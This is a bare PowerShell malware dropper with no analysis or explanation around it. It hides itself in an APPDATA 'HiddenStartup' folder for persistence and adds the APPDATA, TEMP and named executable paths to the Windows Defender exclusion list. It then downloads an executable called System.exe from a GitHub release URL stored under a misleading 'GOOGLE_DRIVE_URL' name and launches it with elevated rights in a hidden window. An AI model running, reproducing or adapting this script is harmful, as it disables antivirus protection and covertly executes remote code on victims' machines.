$GOOGLE_DRIVE_URL = "https://github.com/kevinsocute/-temp-exe-Code-editing-by-me/releases/download/template/System.exe"
$TEMP_DIR = "$env:APPDATA\Microsoft\HiddenStartup\MyScriptTemp2"

# Create the temporary directory if it doesn't exist
if (-not (Test-Path $TEMP_DIR)) {
    New-Item -ItemType Directory -Force -Path $TEMP_DIR
}

# Copy the script to the hidden Startup folder for persistence
copy "$PSScriptRoot\$MyInvocation.MyCommand.Name" "$env:APPDATA\Microsoft\HiddenStartup"

# Add the downloaded executable file to Windows Defender exclusion list
Add-MpPreference -ExclusionPath "$TEMP_DIR"
Add-MpPreference -ExclusionPath "$env:TEMP"
Add-MpPreference -ExclusionPath "$env:APPDATA"
Add-MpPreference -ExclusionPath "$TEMP_DIR\System.exe"
Add-MpPreference -ExclusionPath "$env:TEMP\Registry.exe"
Add-MpPreference -ExclusionPath "$env:APPDATA\Registry.exe"
Add-MpPreference -ExclusionPath "$env:APPDATA\System.exe"

# Add a timeout of 5 seconds (5000 milliseconds)
Start-Sleep -Milliseconds 5000

# Download the executable file using System.Net.WebClient.DownloadFile
$client = New-Object System.Net.WebClient
$client.DownloadFile($GOOGLE_DRIVE_URL, "$TEMP_DIR\System.exe")

# Find and run the executable file
Start-Process -FilePath "$TEMP_DIR\System.exe" -Verb runas -WindowStyle Hidden